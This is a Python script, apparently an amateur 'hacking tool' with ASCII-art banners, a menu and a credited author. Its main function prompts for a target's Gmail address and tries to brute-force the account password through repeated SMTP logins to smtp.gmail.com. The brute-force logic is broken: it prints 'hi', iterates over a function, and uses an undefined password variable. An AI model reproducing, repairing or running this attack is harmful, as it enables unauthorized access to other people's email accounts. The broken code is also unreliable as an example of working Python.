import itertools 
import smtplib
import pywifi
from pywifi import const
import time
from time import sleep
from termcolor import colored
import random
import sys
import os
from random_username.generate import generate_username
from colorama import Fore
import threading
import requests
import subprocess

os.system('cls')

Blue = '\33[94m'
LightBlue = '\033[94m'
RED = '\033[91m'
WHITE = '\33[97m'
YELLOW = '\33[93m'
GREEN = '\033[32m'
LightCyan    = "\033[96m"
END = '\033[0m'

colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']





#definiton start
def check_os_animation():
    print("loading big bro")

    sys.stdout.write(RED + """
    
    █▀▀▀ █▀▀ ▀▀█▀▀ 　 █▀▀█ █▀▀ █▀▀█ █▀▀▄ █──█ 
    █─▀█ █▀▀ ──█── 　 █▄▄▀ █▀▀ █▄▄█ █──█ █▄▄█ 
    ▀▀▀▀ ▀▀▀ ──▀── 　 ▀─▀▀ ▀▀▀ ▀──▀ ▀▀▀─ ▄▄▄█                                                                                                 
            """
    + '\n')
    words = "█████████████"
    for char in words:
        print(char, end='', flush=True)
        sleep(0.0000000000001)
check_os_animation()

print("Finished")


def gmail_hack():

    sys.stdout.write(RED + """
            
    ░██████╗░███╗░░░███╗░█████╗░██╗██╗░░░░░  ██╗░░██╗░█████╗░██╗░░██╗███████╗██████╗░
    ██╔════╝░████╗░████║██╔══██╗██║██║░░░░░  ██║░░██║██╔══██╗██║░██╔╝██╔════╝██╔══██╗
    ██║░░██╗░██╔████╔██║███████║██║██║░░░░░  ███████║███████║█████═╝░█████╗░░██████╔╝
    ██║░░╚██╗██║╚██╔╝██║██╔══██║██║██║░░░░░  ██╔══██║██╔══██║██╔═██╗░██╔══╝░░██╔══██╗
    ╚██████╔╝██║░╚═╝░██║██║░░██║██║███████╗  ██║░░██║██║░░██║██║░╚██╗███████╗██║░░██║
    ░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚══════╝  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝                                                                                                 
            """
    + '\n')  
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    counter = 0
    user = input("Enter Target's Gmail Address: ")
    def print_perms(chars, minlen, maxlen): 
        for n in range(minlen, maxlen+1): 
            for perm in itertools.product(chars, repeat=n):
                print("hi")
                #print(''.join(perm)) 
    print_perms("abcdefghijklmnopqrstuvwxyz1234567890", 6, 6,)
    
    for symbols in print_perms:
        try:
            smtpserver.login(user, password)
            print ("[+] Password Cracked: %s") % symbols
            break
            
        except smtplib.SMTPAuthenticationError:
            print ("[!] Password Inccorect: %s", counter) % symbols
            counter +=1
    else:
        print("klly=ua")

##def  wifi_hack():
    

def logo():
    sys.stdout.write(RED + """

    ░██╗░░░░░░░██╗███████╗██╗░░░░░░█████╗░░█████╗░███╗░░░███╗███████╗  ██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
    ░██║░░██╗░░██║██╔════╝██║░░░░░██╔══██╗██╔══██╗████╗░████║██╔════╝  ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
    ░╚██╗████╗██╔╝█████╗░░██║░░░░░██║░░╚═╝██║░░██║██╔████╔██║█████╗░░  ███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
    ░░████╔═████║░██╔══╝░░██║░░░░░██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░  ██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
    ░░╚██╔╝░╚██╔╝░███████╗███████╗╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗  ██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
    ░░░╚═╝░░░╚═╝░░╚══════╝╚══════╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝  ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝                                                                                                 
            """
    + '\n')

    use_app = colored("Hacking Tool big bro", "red").center(120)
    print(use_app)

    def rainbow_text(x):
        for i in range(len(x)):
            random_color = random.choice(colors)
            print(colored(x[i], random_color), end ="")
        print("                                                                        ")


    x = "made by:hiruy metsihafe".center(114)
    rainbow_text(x)

    text = colored("version beta", "yellow").center(118)
    print(text)

    sys.stdout.write(RED + """
    
    ▀█▀ █░█ █ █▀   █ █▀   █▀▀ █▀█ █▀█   █▀▀ █▀▄ █░█ █▀▀ ▄▀█ ▀█▀ █ █▀█ █▄░█ ▄▀█ █░░   █▀█ █░█ █▀█ █▀█ █▀█ █▀ █▀▀ █▀
    ░█░ █▀█ █ ▄█   █ ▄█   █▀░ █▄█ █▀▄   ██▄ █▄▀ █▄█ █▄▄ █▀█ ░█░ █ █▄█ █░▀█ █▀█ █▄▄   █▀▀ █▄█ █▀▄ █▀▀ █▄█ ▄█ ██▄ ▄█

    █▀█ █▄░█ █░░ █▄█
    █▄█ █░▀█ █▄▄ ░█░                                                                                             
            """
    + '\n')
logo()


def main_menu():
    time.sleep(1.0)
    sys.stdout.flush()
    print("[+]"+"What do you want to perform")
    print("[1]"+"Gmail hack 1-9 digits password only(other is slow)")
    ot = input("select your options : ")

    if ot == '1':
        gmail_hack()
    if ot == '+':
        print("are you serious bruhhhhhhhh")
        main_menu()
    else:
        main_menu()
main_menu()